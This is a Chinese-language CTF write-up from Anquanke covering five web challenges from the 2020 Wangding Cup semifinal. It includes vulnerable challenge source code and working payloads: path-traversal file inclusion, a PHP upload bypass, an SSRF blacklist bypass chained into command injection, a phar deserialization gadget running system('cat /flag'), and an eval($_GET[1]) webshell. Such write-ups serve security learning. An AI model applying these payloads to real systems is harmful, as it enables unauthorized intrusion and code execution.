# 2020第二届网鼎杯半决赛Web题目writeup

阅读量 **264316**

|评论 **8**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-12-07 11:00:37

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0168ba2d87d1f63158.png)

有幸参加了第二届网鼎杯的决赛和半决赛，被各路神仙锤爆。赛后对几道web题目进行了整理和复现，下面分享一下思路和方法，本人才疏学浅，如有错误，还请师傅们批评指正。

## Day 1

###  0x01 AliceWebsite

应该是最简单的题了，一上来就被秒了，代码很简单。在index.php中有一个毫无过滤的本地文件包含，

    
    
    //index.php
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <title>Wecome to Alice's Website!</title>
        <link href="./bootstrap/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body>
        <nav class="navbar navbar-inverse navbar-fixed-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                        <span class="sr-only">Alice's Website</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a class="navbar-brand" href="index.php?action=home.php">Alice's Website</a>
                </div>
                <div id="navbar" class="collapse navbar-collapse">
                    <ul class="nav navbar-nav">
                        <li class="active"><a href="index.php?action=home.php">Home</a></li>
                        <li><a href="index.php?action=about.php">About</a></li>
                    </ul>
                </div>
            </div>
        </nav>
        <div class="container" style="padding-top: 5%">
            <?php
            $action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');
            if (file_exists($action)) {
                include $action;
            } else {
                echo "File not found!";
            }
            ?>
        </div>
    </body>
    </html>
    

直接http://ip/action=../../../../../../flag 就可以。

###  0x02 faka

题目给了源码，看了是一个什么自动发卡平台，首页是下面这样

![](https://p2.ssl.qhimg.com/t018ca77f08e9e217a2.png)

基于thinkphp写的，记得之前在先知上看过一篇分析的文章，漏洞点在`application/admin/controller/Plugs.php`

![](https://p3.ssl.qhimg.com/t0150028d6fb1c3b3b6.png)

首先通过`$this->request->file()`来获取上传的文件信息，`$this->request->file()`是thinkphp实现的用来获取上传文件信息的函数，详细代码如下：

    
    
    /**
         * 获取上传的文件信息
         * @access public
         * @param string|array $name 名称
         * @return null|array|\think\File
         */
        public function file($name = '')
        {
            if (empty($this->file)) {
                $this->file = isset($_FILES) ? $_FILES : [];
            }
            if (is_array($name)) {
                return $this->file = array_merge($this->file, $name);
            }
            $files = $this->file;
            if (!empty($files)) {
                // 处理上传文件
                $array = [];
                foreach ($files as $key => $file) {
                    if (is_array($file['name'])) {
                        $item  = [];
                        $keys  = array_keys($file);
                        $count = count($file['name']);
                        for ($i = 0; $i < $count; $i++) {
                            if (empty($file['tmp_name'][$i]) || !is_file($file['tmp_name'][$i])) {
                                continue;
                            }
                            $temp['key'] = $key;
                            foreach ($keys as $_key) {
                                $temp[$_key] = $file[$_key][$i];
                            }
                            $item[] = (new File($temp['tmp_name']))->setUploadInfo($temp);
                        }
                        $array[$key] = $item;
                    } else {
                        if ($file instanceof File) {
                            $array[$key] = $file;
                        } else {
                            if (empty($file['tmp_name']) || !is_file($file['tmp_name'])) {
                                continue;
                            }
                            $array[$key] = (new File($file['tmp_name']))->setUploadInfo($file);
                        }
                    }
                }
                if (strpos($name, '.')) {
                    list($name, $sub) = explode('.', $name);
                }
                if ('' === $name) {
                    // 获取全部文件
                    return $array;
                } elseif (isset($sub) && isset($array[$name][$sub])) {
                    return $array[$name][$sub];
                } elseif (isset($array[$name])) {
                    return $array[$name];
                }
            }
            return;
        }
    

然后通过`pathinfo()`获取上传文件的扩展名，如果扩展名为`php`或者不在允许上传的类型中的话，会返回文件上传类型受限；然后将`POST`传的`md5`值以十六位一组，进行切片，之后分别将这两组字符串作为路径和文件名，最后在加上之前得到的文件扩展名赋值给`$filename`；在上传文件之前还有一个Token验证，会判断`POST`传的`token`值是否为`$filename`拼接上`session_id()`的`md5`值，经过测试这里的`session_id()`返回的是空字符串，而且我们知道`$filename`，所以可以很容易的绕过这里的检测；然后看关键的部分，跟进`move()`函数，

    
    
    /**
         * 移动文件
         * @access public
         * @param  string      $path     保存路径
         * @param  string|bool $savename 保存的文件名 默认自动生成
         * @param  boolean     $replace  同名文件是否覆盖
         * @return false|File
         */
        public function move($path, $savename = true, $replace = true)
        {
            // 文件上传失败，捕获错误代码
            if (!empty($this->info['error'])) {
                $this->error($this->info['error']);
                return false;
            }
    
            // 检测合法性
            if (!$this->isValid()) {
                $this->error = 'upload illegal files';
                return false;
            }
    
            // 验证上传
            if (!$this->check()) {
                return false;
            }
    
            $path = rtrim($path, DS) . DS;
            // 文件保存命名规则
            $saveName = $this->buildSaveName($savename);
            $filename = $path . $saveName;
    
            // 检测目录
            if (false === $this->checkPath(dirname($filename))) {
                return false;
            }
    
            // 不覆盖同名文件
            if (!$replace && is_file($filename)) {
                $this->error = ['has the same filename: {:filename}', ['filename' => $filename]];
                return false;
            }
    
            /* 移动文件 */
            if ($this->isTest) {
                rename($this->filename, $filename);
            } elseif (!move_uploaded_file($this->filename, $filename)) {
                $this->error = 'upload write error';
                return false;
            }
    
            // 返回 File 对象实例
            $file = new self($filename);
            $file->setSaveName($saveName)->setUploadInfo($this->info);
    
            return $file;
        }
    

前面是对文件的一些检测，在`$this->check()`函数中会调用`checkImg()`函数来检查上传的文件是否真的为图片，

![](https://p4.ssl.qhimg.com/t01b826be93fcc4eca8.png)

通过检测后会进入`buildSaveName($savename)`，跟进

    
    
    /**
         * 获取保存文件名
         * @access protected
         * @param  string|bool $savename 保存的文件名 默认自动生成
         * @return string
         */
        protected function buildSaveName($savename)
        {
            // 自动生成文件名
            if (true === $savename) {
                if ($this->rule instanceof \Closure) {
                    $savename = call_user_func_array($this->rule, [$this]);
                } else {
                    switch ($this->rule) {
                        case 'date':
                            $savename = date('Ymd') . DS . md5(microtime(true));
                            break;
                        default:
                            if (in_array($this->rule, hash_algos())) {
                                $hash     = $this->hash($this->rule);
                                $savename = substr($hash, 0, 2) . DS . substr($hash, 2);
                            } elseif (is_callable($this->rule)) {
                                $savename = call_user_func($this->rule);
                            } else {
                                $savename = date('Ymd') . DS . md5(microtime(true));
                            }
                    }
                }
            } elseif ('' === $savename || false === $savename) {
                $savename = $this->getInfo('name');
            }
    
            if (!strpos($savename, '.')) {
                $savename .= '.' . pathinfo($this->getInfo('name'), PATHINFO_EXTENSION);
            }
    
            return $savename;
        }
    

这里的`$savename`是我们`move()`函数的第二个参数，就是前面的`$md5[1]`，经过`buildSaveName($savename)`后会直接返回`$md5[1]`，然后拼接在`$path`的后面做为文件名，后面直接调用`move_uploaded_file()`将文件移动到`$path`，在这个过程中`$ma5[1]`是可控的，所以我们可以直接上传php文件。首先生成带木马的图片，然后生成token值，

    
    
    php > echo md5("aa");
    4124bc0a9335c27f086f24ba207a4912
    echo md5("4124bc0a9335c27f/086f24ba207a.php.png");
    bf9b89e7c8f5f1159d8bd7aaaa9c795d
    

![](https://p5.ssl.qhimg.com/t0195e015808909b7ab.png)

虽然显示文件上传失败，但实际是成功的

![](https://p3.ssl.qhimg.com/t0124dff92466e1c3ee.png)

###  0x03 web_babyJS

题目关键的代码如下

    
    
    //routes/index.js
    var express = require('express');
    var config = require('../config');
    var url=require('url');
    var child_process=require('child_process');
    var fs=require('fs');
    var request=require('request');
    var router = express.Router();
    
    
    var blacklist=['127.0.0.1.xip.io','::ffff:127.0.0.1','127.0.0.1','0','localhost','0.0.0.0','[::1]','::1'];
    
    router.get('/', function(req, res, next) {
        res.json({});
    });
    
    router.get('/debug', function(req, res, next) {
        console.log(req.ip);
        if(blacklist.indexOf(req.ip)!=-1){
            console.log('res');
        var u=req.query.url.replace(/[\"\']/ig,'');
        console.log(url.parse(u).href);
        let log=`echo  '${url.parse(u).href}'>>/tmp/log`;
        console.log(log);
        child_process.exec(log);
        res.json({data:fs.readFileSync('/tmp/log').toString()});
        }else{
            res.json({});
        }
    });
    
    
    router.post('/debug', function(req, res, next) {
        console.log(req.body);
        if(req.body.url !== undefined) {
            var u = req.body.url;
        var urlObject=url.parse(u);
        if(blacklist.indexOf(urlObject.hostname) == -1){
            var dest=urlObject.href;
            request(dest,(err,result,body)=>{
                res.json(body);
            })
        }
        else{
            res.json([]);
        }
        }
    });
    module.exports = router;
    

首先在`GET`方式的`debug`路由中，存在可控的命令执行，但是需要`req.ip`为黑名单的`ip`，那么就可以确定这是一道`SSRF`题目了，然后看`POST`方式`debug`路由，可知这道题目的解题方法应该是通过`POST`访问`debug`路由，传递`url`参数，使`url`参数经过`url.parse()`处理后对应的`hostname`不在黑名单中，然后调用`request()`去访问`url.parse`处理后的`href`，这里由于黑名单过滤不全，可以通过`http://2130706433/`、`http://0177.0.0.01/`等方式绕过；之后就是要闭合单引号，执行多条命令了，经过测试发现，在`@`符号之前输入`%27`，会经过url解码变成单引号，如下

    
    
    var url=require('url');
    
    var request=require('request');
    var u = "http://aaa%27@:8000%27qq.com";
    
    urlObject=url.parse(u);
    console.log(urlObject);
    
    /*
    Url {
      protocol: 'http:',
      slashes: true,
      auth: 'aaa\'',
      host: ':8000',
      port: '8000',
      hostname: '',
      hash: null,
      search: null,
      query: null,
      pathname: '%27qq.com',
      path: '%27qq.com',
      href: 'http://aaa\'@:8000/%27qq.com' }
      */
    

之后就是执行命令了，但是没有回显，可以尝试将`flag`写入文件中，经过测试发现`>`、`}`和空格符等字符都会被编码，就不能利用`cat`和`>`来写入文件了，所以最后利用`cp`将`flag`复制到`/tmp/log/`中，然后直接就可以直接读FLAG了。  
payload: `http://2130706433/debug?url=http://%2527[@1](https://github.com/1
"@1");cp$IFS$9/flag$IFS$9/tmp/log;%23`

![](https://p3.ssl.qhimg.com/t010326c470faad08d1.png)

## Day2

###  0x01 game_exp

审计源码发现有下面两个反序列化利用点，

![](https://p2.ssl.qhimg.com/t01b3e9fda52b2f59f1.png)

![](https://p1.ssl.qhimg.com/t0115e378f69e0b2acd.png)

通过`info.php`，可以看到服务器段开启了soap扩展，可以进行SSRF，执行命令。然后寻找可以触发反序列化的点，在`login/register.php`中存在一个`file_exists()`函数，这个函数可以触发`phar`文件的反序列化，审计`register.php`

![](https://p3.ssl.qhimg.com/t01497a3ec4e036b549.png)

上传的图片限制死了类型只能为图片，但是文件名和路径是可控的，可以先上传phar文件，然后再注册一遍用户，对应的用户名为`phar://`加上之前注册的用户名，然后在`file_exists()`函数触发反序列化，首先生成`phar`文件，

    
    
    <?php
    class AnyClass{
        function __construct()
        {
            $this -> output = 'system("cat /flag");';;
        }
    }
    $object = new AnyClass();
    $phar = new Phar('a.phar');
    $phar -> startBuffering();
    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');   //设置stub，增加gif文件头
    $phar ->addFromString('test.txt','test');  //添加要压缩的文件
    $phar -> setMetadata($object);  //将自定义meta-data存入manifest
    $phar -> stopBuffering();
    ?>
    

修改后缀名后上传

![](https://p0.ssl.qhimg.com/t01f8a2d527b7e8e936.png)

然后继续注册一个`phar://asdf`的用户去触发反序列化

![](https://p5.ssl.qhimg.com/t01c31f9f064f56fad5.png)

###  0x02 novel

打开靶机是下面这样的界面

![](https://p4.ssl.qhimg.com/t018d4a97564eb4bb01.png)

可以上传和备份文件，然后审计源码，

    
    
    //index.php
    <?php
    defined('DS') or define('DS', DIRECTORY_SEPARATOR);
    define('APP_DIR', realpath('./'));
    error_reporting(0);
    function autoload_class($class){
        foreach(array('class') as $dir){
            $file = APP_DIR.DS.$dir.DS.$class.'.class.php';
             //echo $file;
            if(file_exists($file)){
                //echo $file;
                include_once $file;
            }
        }
    }
    
    function upload($config){
        $upload_config['class']=$config['class'];
        foreach(array('file','method') as $param){
            $upload_config['data'][$param]=$config[$param];
        }
        // var_dump($upload_config);
        return $upload_config;
    }
    
    function home($config){
        $home_config['class']=$config['class'];
        $home_config['data']['method']=$config['method'];
        return $home_config;
    }
    
    function back($config){
        $copy_config['class']=$config['class'];
        $copy_config['data']['method']=$config['method'];
        $copy_config['data']['filename']=$config['post']['filename'];
        $copy_config['data']['dest']=$config['post']['dest'];
        return $copy_config;
    }
    
    spl_autoload_register('autoload_class');
    
    $request=isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:'/';
    
    $config['get']=$_GET;
    $config['post']=$_POST;
    $config['file']=$_FILES;
    
    $parameters=explode('/',explode('?', $request)[0]);
    $class=(isset($parameters[1]) && !empty($parameters[1]))?$parameters[1]:'home';
     //echo $class;
    $method=(isset($parameters[2]) && !empty($parameters[2]))?$parameters[2]:'index';
     //echo $method;
    
    $config['class']=$class;
    $config['method']=$method;
    
    
    if(!empty($class)){
        if(in_array($class, array('upload','home','back'))){
            $class_init_config=call_user_func($class, $config);
            new $class_init_config['class']($class_init_config['data']);
        }else{
            header('Location: /');
        }
    }
    

index.php中实现了有一个类自动加载，可以以`http://ip/class/method`的形式去调用对应类的函数，然后在`class`文件夹中有三个文件，分别为`home.class.php`、
`upload.class.php` 、`back.class.php`，分别对应主页、上传和备份功能的实现，接下来审计这三个文件，首先看文件上传的实现，

![](https://p5.ssl.qhimg.com/t013ce850304e16dd1e.png)

文件被上传到`profile`目录，文件名可控，但是后缀限制死了只能用txt，然后看备份功能的实现，

    
    
    //back.class.php
    <?php
    class back{
        public $filename;
        public $method;
        public $dest;
    
        function __construct($config){
            $this->filename=$config['filename'];
            $this->method=$config['method'];
            $this->dest=$config['dest'];
            if(in_array($this->method, array('backup'))){
                $this->{$this->method}($this->filename, $this->dest);
            }else{
                    header('Location: /');
            }
        }
    
        public function backup($filename, $dest){
            $filename='profile/'.$filename;
            if(file_exists($filename)){
                $content=htmlspecialchars(file_get_contents($filename),ENT_QUOTES);
                $password=$this->random_code();
                $r['path']=$this->_write($dest, $this->_create($password, $content));
                $r['password']=$password;
                echo json_encode($r);
            }
        }
    
        /* 先验证保证为备份文件后,再保存为私藏文件 */
        private function _write($dest, $content){
            $f1=$dest;
            $f2='private/'.$this->random_code(10).".php";
    
            $stream_f1 = fopen($f1, 'w+');
            fwrite($stream_f1, $content);
            rewind($stream_f1);
            $f1_read=fread($stream_f1, 3000);
    
            preg_match('/^<\?php \$_GET\[\"password\"\]===\"[a-zA-Z0-9]{8}\"\?print\(\".*\"\):exit\(\); $/s', $f1_read, $matches);
    
            if(!empty($matches[0])){
                copy($f1,$f2);
                fclose($stream_f1);   
                return $f2;     
            }else{
                fwrite($stream_f1, '<?php exit(); ?>');
                fclose($stream_f1);
                return false;
            }
    
        }
    
        private function _create($password, $content){
            $_content='<?php $_GET["password"]==="'.$password.'"?print("'.$content.'"):exit(); ';
            return $_content;
        }
    
        private function random_code($length = 8,$chars = null){
            if(empty($chars)){
                $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            }
            $count = strlen($chars) - 1;
            $code = '';
            while( strlen($code) < $length){
                $code .= substr($chars,rand(0,$count),1);
            }
            return $code;
        }
    }
    

阅读代码可以发现，程序首先将`$filename`拼接到`profile/`，然后检测文件是否存在，若存在，将文件内容读出来进行html编码，然后生成一个随机的字符串作为读取文件内容的密码，之后调用`_create()`函数，将密码和html编码后的文件内容，拼接到`'<?php
$_GET["password"]==="'.$password.'"?print("'.$content.'"):exit();
'`里，之后调用`_write()`函数，将上面这段php代码写进`private`目录，然后对文件内容内容进行正则表达式的检测，若通过检测,将文件内容写进`$dest`，并复制一份到`$f2`，若没有通过检测，则在`$dest`中写入`<?php
exit(); ?>`。

理清程序大体流程后，大致的攻击思路就是上传一个txt的文件，然后再通过back生成php文件，开始尝试使用`"?>`闭合前面，但是不能成功，`htmlspecialchars()`会将双引号和尖括号编码，之后采用复杂语法，`{${phpinfo()}}`进行rce。首先上传一个内容为`{${eval($_GET[1])}}`的txt,

![](https://p4.ssl.qhimg.com/t01c66a8387e120a0ba.png)

之后调用`back`的`backup()`函数将一句话写进php文件，

![](https://p0.ssl.qhimg.com/t01bd4c4f8d0998fb7e.png)

然后访问

![](https://p5.ssl.qhimg.com/t01f0ca6304d497f0eb.png)

经过这次比赛后，感觉一些知识点的积累还是远远不够的，很多`web`题目都没有修复成功（太菜了），还有一道`java`题肝不动，上面的每道题应该都不止我分享的这种做法，欢迎师傅们评论分享其他骚的思路、修复的骚操作或者是那道`java`题的做法。另外有需要源码的同学可以联系我哈。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Mount4in** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/224207](/post/id/224207)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __6赞

 __收藏

![](https://p5.ssl.qhimg.com/t01e498abec71bb4199.png) Mount4in

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

